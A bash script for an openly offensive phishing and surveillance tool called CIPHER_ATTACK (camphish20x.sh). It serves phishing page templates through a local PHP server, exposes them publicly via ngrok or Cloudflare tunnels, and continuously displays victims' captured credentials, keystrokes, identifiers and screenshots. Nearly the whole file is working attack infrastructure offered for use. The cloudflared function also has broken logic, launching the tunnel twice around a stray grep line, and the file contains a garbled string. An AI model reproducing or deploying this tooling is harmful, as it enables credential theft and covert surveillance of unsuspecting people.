#!/bin/bash

# ==============================================================================
# Project: CIPHER_ATTACK - Advanced Phishing & Surveillance Tool
# File: camphish20x.sh
# Description: Main script for setting up phishing campaigns, managing tunnels,
#              and collecting data. Includes advanced features like keylogging,
#              screenshotting, dynamic session management, and robust error handling.
# ==============================================================================

# --- Configuration & Global Variables ---
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMPLATES_DIR="$BASE_DIR/templates"
COLLECTED_DATA_BASE_DIR="$BASE_DIR/collected_data"
CONFIG_DIR="$BASE_DIR/config"
ASSETS_DIR="$BASE_DIR/assets"
BANNER_FILE="$ASSETS_DIR/banner.txt"
TUNNELS_CONF="$CONFIG_DIR/tunnels.conf"

PHP_PORT=8080 # Default PHP web server port
NGROK_PID=""
CLOUDFLARED_PID=""
PHP_PID=""
CURRENT_SESSION_DIR=""
PHISHING_URL=""
SELECTED_TEMPLATE_DIR=""
COLLECTOR_PHP_COPY="" # Path to the session-specific collector.php copy

# --- Color Codes ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- Utility Functions ---

# Function to display messages
log_info() { echo -e "${CYAN}[*] $1${NC}"; }
log_success() { echo -e "${GREEN}[+] $1${NC}"; }
log_warn() { echo -e "${YELLOW}[!] $1${NC}"; }
log_error() { echo -e "${RED}[-] $1${NC}"; }

# Function to display banner
display_banner() {
    if [ -f "$BANNER_FILE" ]; then
        cat "$BANNER_FILE"
        echo ""
    else
        log_warn "Banner file not found: $BANNER_FILE"
        echo -e "${GREEN}SCREEN & KEYLOGGING v2.0X - Advanced Phishing Tool${NC}"
        echo ""
    fi
}

# Function to check for required dependencies
check_dependencies() {
    log_info "Checking dependencies..."
    local missing_deps=()
    for cmd in php curl wget unzip; do
        if ! command -v "$cmd" &> /dev/null; then
            missing_deps+=("$cmd")
        fi
    done

    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_error "Missing dependencies: ${missing_deps[*]}"
        log_error "Please install them using your package manager (e.g., sudo apt install ${missing_deps[*]})"
        exit 1
    fi
    log_success "All core dependencies met."
}

# Function to install Ngrok
install_ngrok() {
    log_info "Ngrok not found. Installing Ngrok..."
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O /tmp/ngrok.zip || { log_error "Failed to download Ngrok."; return 1; }
        unzip -q /tmp/ngrok.zip -d /tmp/ || { log_error "Failed to unzip Ngrok."; return 1; }
        mv /tmp/ngrok /usr/local/bin/ngrok || { log_error "Failed to move Ngrok to /usr/local/bin. Try with sudo: sudo mv /tmp/ngrok /usr/local/bin/ngrok"; return 1; }
        chmod +x /usr/local/bin/ngrok || { log_error "Failed to set Ngrok executable permissions."; return 1; }
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS
        brew install ngrok || { log_error "Failed to install Ngrok via Homebrew. Please install Homebrew or Ngrok manually."; return 1; }
    else
        log_error "Unsupported OS for automatic Ngrok installation. Please install Ngrok manually."
        return 1
    fi
    log_success "Ngrok installed successfully."
    return 0
}

# Function to install Cloudflared
install_cloudflared() {
    log_info "Cloudflared not found. Installing Cloudflared..."
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        curl -s https://pkg.cloudflare.com/cloudflare-release-latest.deb -o /tmp/cloudflare-release-latest.deb || { log_error "Failed to download cloudflare-release.deb."; return 1; }
        sudo dpkg -i /tmp/cloudflare-release-latest.deb || { log_error "Failed to install cloudflare-release.deb. Check if dpkg is installed."; return 1; }
        sudo apt update || { log_error "Failed to update apt repositories."; return 1; }
        sudo apt install cloudflared -y || { log_error "Failed to install cloudflared."; return 1; }
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS
        brew install cloudflare/cloudflare/cloudflared || { log_error "Failed to install Cloudflared via Homebrew. Please install Homebrew or Cloudflared manually."; return 1; }
    else
        log_error "Unsupported OS for automatic Cloudflared installation. Please install Cloudflared manually."
        return 1
    fi
    log_success "Cloudflared installed successfully."
    return 0
}

# Function to get Ngrok auth token
get_ngrok_token() {
    local token=""
    if [ -f "$TUNNELS_CONF" ]; then
        token=$(grep -E "^NGROK_AUTH_TOKEN=" "$TUNNELS_CONF" | cut -d'=' -f2 | tr -d '"')
    fi

    if [ -z "$token" ] || [ "$token" == "your_ngrok_auth_token_here" ]; then
        log_warn "Ngrok auth token not found or not configured in $TUNNELS_CONF."
        read -p "$(echo -e "${YELLOW}[?] Enter your Ngrok auth token: ${NC}")" token_input
        if [ -z "$token_input" ]; then
            log_error "Ngrok auth token cannot be empty."
            return 1
        fi
        # Update tunnels.conf with the new token
        if [ -f "$TUNNELS_CONF" ]; then
            sed -i "s/^NGROK_AUTH_TOKEN=.*/NGROK_AUTH_TOKEN=\"$token_input\"/" "$TUNNELS_CONF"
        else
            log_warn "$TUNNELS_CONF not found. Creating it."
            echo "NGROK_AUTH_TOKEN=\"$token_input\"" > "$TUNNELS_CONF"
        fi
        token="$token_input"
        log_success "Ngrok auth token saved to $TUNNELS_CONF."
    fi
    echo "$token"
    return 0
}

# Function to select a phishing template
select_template() {
    log_info "Available Phishing Templates:"
    local templates=()
    local i=1
    for d in "$TEMPLATES_DIR"/*/; do
        if [ -d "$d" ]; then
            template_name=$(basename "$d")
            templates+=("$template_name")
            echo -e "${GREEN}[$i]${NC} $template_name"
            i=$((i+1))
        fi
    done

    if [ ${#templates[@]} -eq 0 ]; then
        log_error "No templates found in $TEMPLATES_DIR. Please add templates."
        exit 1
    fi

    echo ""
    read -p "$(echo -e "${YELLOW}[?] Choose a template (number): ${NC}")" choice
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#templates[@]} ]; then
        log_error "Invalid choice. Exiting."
        exit 1
    fi

    SELECTED_TEMPLATE_DIR="$TEMPLATES_DIR/${templates[$((choice-1))]}"
    log_success "Selected template: ${templates[$((choice-1))]}"
}

# Function to create a unique session directory for collected data
create_session_dir() {
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local random_suffix=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    CURRENT_SESSION_DIR="$COLLECTED_DATA_BASE_DIR/${timestamp}_${random_suffix}"

    mkdir -p "$CURRENT_SESSION_DIR/screenshots" || { log_error "Failed to create session directory: $CURRENT_SESSION_DIR"; exit 1; }
    log_success "Session data will be saved in: $CURRENT_SESSION_DIR"
}

# Function to configure collector.php for the current session
configure_collector_php() {
    local template_collector_php="$SELECTED_TEMPLATE_DIR/collector.php"
    COLLECTOR_PHP_COPY="$CURRENT_SESSION_DIR/collector.php" # Copy to session dir to modify

    if [ ! -f "$template_collector_php" ]; then
        log_error "Collector.php not found in selected template: $template_collector_php"
        exit 1
    fi

    # Copy the collector.php to the session directory
    cp "$template_collector_php" "$COLLECTOR_PHP_COPY" || { log_error "Failed to copy collector.php to session directory."; exit 1; }

    # Replace the placeholder with the actual session data path
    sed -i "s|__COLLECTED_DATA_PATH__|$CURRENT_SESSION_DIR|g" "$COLLECTOR_PHP_COPY" || { log_error "Failed to configure collector.php."; exit 1; }

    log_success "Collector.php configured for current session."
}

# Function to start PHP web server
start_php_server() {
    log_info "Starting PHP web server on port $PHP_PORT..."
    # PHP server needs to serve from the template directory
    # But collector.php needs to be the one from the session folder.
    # We will use a symlink or ensure the collector.php in the template uses the session one.
    # A simpler approach: create a temporary directory for the session, copy template files and the configured collector.php there, and serve that.

    local TEMP_SERVE_DIR="$CURRENT_SESSION_DIR/serve"
    mkdir -p "$TEMP_SERVE_DIR" || { log_error "Failed to create temporary serve directory."; exit 1; }

    # Copy all template files to the temporary serve directory
    cp -r "$SELECTED_TEMPLATE_DIR"/* "$TEMP_SERVE_DIR/" || { log_error "Failed to copy template files to serve directory."; exit 1; }

    # Replace the template's collector.php with the session-specific configured one
    cp "$COLLECTOR_PHP_COPY" "$TEMP_SERVE_DIR/collector.php" || { log_error "Failed to replace collector.php in serve directory."; exit 1; }

    php -S 127.0.0.1:$PHP_PORT -t "$TEMP_SERVE_DIR" > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2 # Give PHP server time to start
    if ! ps -p "$PHP_PID" > /dev/null; then
        log_error "PHP web server failed to start."
        exit 1
    fi
    log_success "PHP web server started. Serving from: $TEMP_SERVE_DIR"
}

# Function to start Ngrok tunnel
start_ngrok_tunnel() {
    log_info "Starting Ngrok tunnel..."
    local ngrok_token=$(get_ngrok_token)
    if [ -z "$ngrok_token" ]; then
        return 1
    fi

    # Authenticate Ngrok if not already
    ngrok config add-authtoken "$ngrok_token" > /dev/null 2>&1

    ngrok http $PHP_PORT --log "stdout" > /dev/null 2>&1 &
    NGROK_PID=$!
    sleep 5 # Give Ngrok time to establish connection

    if ! ps -p "$NGROK_PID" > /dev/null; then
        log_error "Ngrok failed to start. Check your Ngrok token or network."
        return 1
    fi

    # Fetch public URL from Ngrok API
    local ngrok_url=""
    for i in {1..10}; do
        ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
        if [ -n "$ngrok_url" ] && [ "$ngrok_url" != "null" ]; then
            break
        fi
        sleep 2
    done

    if [ -z "$ngrok_url" ] || [ "$ngrok_url" == "null" ]; then
        log_error "Failed to get Ngrok public URL."
        return 1
    fi

    PHISHING_URL="$ngrok_url"
    log_success "Ngrok tunnel established: $PHISHING_URL"
    return 0
}

# Function to start Cloudflared tunnel
start_cloudflared_tunnel() {
    log_info "Starting Cloudflared tunnel..."
    local cloudflared_cmd="cloudflared"
    local cloudflared_path=""

    if [ -f "$TUNNELS_CONF" ]; then
        cloudflared_path=$(grep -E "^CLOUDFLARED_PATH=" "$TUNNELS_CONF" | cut -d'=' -f2 | tr -d '"')
    fi

    if [ -n "$cloudflared_path" ] && [ -x "$cloudflared_path" ]; then
        cloudflared_cmd="$cloudflared_path"
    elif ! command -v cloudflared &> /dev/null; then
        install_cloudflared || return 1
    fi

    "$cloudflared_cmd" tunnel --url http://127.0.0.1:$PHP_PORT > /dev/null 2>&1 &
    CLOUDFLARED_PID=$!
    sleep 5 # Give cloudflared time to establish connection

    if ! ps -p "$CLOUDFLARED_PID" > /dev/null; then
        log_error "Cloudflared failed to start. Check your Cloudflared installation or network."
        return 1
    fi
    # Cloudflared doesn't expose a local API like Ngrok. We need to parse its stdout/stderr for the URL.
    # This is a bit tricky, often the URL is printed to stderr.
    # For a robust solution, you might need to redirect stderr to a file and parse it.
    # For now, we'll try to get it from a common log pattern.
    # A more reliable way is to use `cloudflared tunnel create` and `cloudflared tunnel run` with a named tunnel,
    # but for a quick temporary tunnel, parsing output is common.
    # Example of a line that might be causing the issue
    CLOUD_URL=$(grep -o 'https://[^ ]*\.trycloudflare\.com' /tmp/cloudflared_log_*.txt)

    local cloudflared_log_file="/tmp/cloudflared_log_$(date +%s).txt"
    "$cloudflared_cmd" tunnel --url http://127.0.0.1:$PHP_PORT --logfile "$cloudflared_log_file" > /dev/null 2>&1 &
    CLOUDFLARED_PID=$!

    local cloudflare_url=""
    for i in {1..20}; do # Try for 20 seconds
        cloudflare_url=$(grep -E "https://[a-zA-Z0-9-]+\.trycloudflare\.com" "$cloudflared_log_file" | head -n 1 | awk '{print $NF}')
        if [ -n "$cloudflare_url" ]; then
            break
        fi
        sleep 1
    done
    rm -f "$cloudflared_log_file" # Clean up log file

    if [ -z "$cloudflare_url" ]; then
        log_error "Failed to get Cloudflared public URL. Ensure cloudflared is installed and running correctly."
        return 1
    fi

    PHISHING_URL="$cloudflare_url"
    log_success "Cloudflared tunnel established: $PHISHING_URL"
    return 0
}

# Function to select tunneling service
select_tunnel() {
    log_info "Select Tunneling Service:"
    echo -e "${GREEN}[1]${NC} Ngrok (Recommended for external access)"
    echo -e "${GREEN}[2]${NC} Cloudflare Tunnel (Recommended for external access, no token needed)"
    echo -e "${GREEN}[3]${NC} LocalHost (For local testing only)"
    echo ""
    read -p "$(echo -e "${YELLOW}[?] Choose a tunneling option (number): ${NC}")" tunnel_choice

    case "$tunnel_choice" in
        1)
            if ! command -v ngrok &> /dev/null; then
                install_ngrok || { log_error "Ngrok installation failed. Exiting."; exit 1; }
            fi
            start_ngrok_tunnel || { log_error "Ngrok tunnel failed to start. Exiting."; exit 1; }
            ;;
        2)
            if ! command -v cloudflared &> /dev/null; then
                install_cloudflared || { log_error "Cloudflared installation failed. Exiting."; exit 1; }
            fi
            start_cloudflared_tunnel || { log_error "Cloudflared tunnel failed to start. Exiting."; exit 1; }
            ;;
        3)
            PHISHING_URL="http://127.0.0.1:$PHP_PORT"
            log_success "LocalHost server selected: $PHISHING_URL"
            ;;
        *)
            log_error "Invalid tunneling option. Exiting."
            exit 1
            ;;
    esac
}

# Function to monitor collected data
monitor_data() {
    log_info "Monitoring collected data..."
    log_info "Phishing URL: ${GREEN}$PHISHING_URL${NC}"
    log_info "Press ${RED}Ctrl+C${NC} to stop CamPhish20X."

    local credentials_file="$CURRENT_SESSION_DIR/credentials.txt"
    local keylogs_file="$CURRENT_SESSION_DIR/keylogs.txt"
    local identifiers_file="$CURRENT_SESSION_DIR/identifiers_only.txt"
    local screenshots_dir="$CURRENT_SESSION_DIR/screenshots"

    echo ""
    echo -e "${MAGENTA}=======================================================${NC}"
    echo -e "${MAGENTA}             CIPHER TOOL WORKING.             ${NC}"
    echo -e "${MAGENTA}=======================================================${NC}"
    echo ""

    # Initial check for existing data
    if [ -f "$credentials_file" ]; then log_success "Credentials Found:"; cat "$credentials_file"; fi
    if [ -f "$keylogs_file" ]; then log_success "Keylogs Found:"; cat "$keylogs_file"; fi
    if [ -f "$identifiers_file" ]; then log_success "Identifiers Found:"; cat "$identifiers_file"; fi
    local initial_screenshot_count=$(ls -1 "$screenshots_dir" 2>/dev/null | wc -l)
    if [ "$initial_screenshot_count" -gt 0 ]; then log_success "Screenshots Found: $initial_screenshot_count"; fi

    # Use tail -f for continuous monitoring of text files
    (
        tail -f "$credentials_file" 2>/dev/null &
        tail -f "$keylogs_file" 2>/dev/null &
        tail -f "$identifiers_file" 2>/dev/null &

        # Monitor screenshots directory (more complex, simple count for now)
        local current_screenshot_count="$initial_screenshot_count"
        while true; do
            local new_screenshot_count=$(ls -1 "$screenshots_dir" 2>/dev/null | wc -l)
            if [ "$new_screenshot_count" -gt "$current_screenshot_count" ]; then
                log_success "New screenshot captured! Total: $new_screenshot_count"
                current_screenshot_count="$new_screenshot_count"
            fi
            sleep 5 # Check for new screenshots every 5 seconds
        done
    ) &
    local MONITOR_PID=$!
    wait "$MONITOR_PID" # Wait for the monitoring processes to finish (i.e., when main script exits)
}

# Function for graceful shutdown
cleanup() {
    log_warn "Stopping CIPHER_ATTACKIlNNG..."
    if [ -n "$NGROK_PID" ] && ps -p "$NGROK_PID" > /dev/null; then
        kill "$NGROK_PID"
        log_info "Ngrok tunnel stopped."
    fi
    if [ -n "$CLOUDFLARED_PID" ] && ps -p "$CLOUDFLARED_PID" > /dev/null; then
        kill "$CLOUDFLARED_PID"
        log_info "Cloudflared tunnel stopped."
    fi
    if [ -n "$PHP_PID" ] && ps -p "$PHP_PID" > /dev/null; then
        kill "$PHP_PID"
        log_info "PHP web server stopped."
    fi
    # Remove temporary serve directory if it exists
    if [ -n "$CURRENT_SESSION_DIR" ] && [ -d "$CURRENT_SESSION_DIR/serve" ]; then
        rm -rf "$CURRENT_SESSION_DIR/serve"
        log_info "Cleaned up temporary serve directory."
    fi
    log_success "CIPHER_ATTACK stopped gracefully. Collected data is in $CURRENT_SESSION_DIR"
    exit 0
}

# --- Main Logic ---
trap cleanup SIGINT SIGTERM # Register cleanup function for Ctrl+C and termination signals

clear
display_banner
check_dependencies
select_template
create_session_dir
configure_collector_php
start_php_server
select_tunnel
monitor_data

# Keep the script running until Ctrl+C is pressed
while true; do
    sleep 1
done
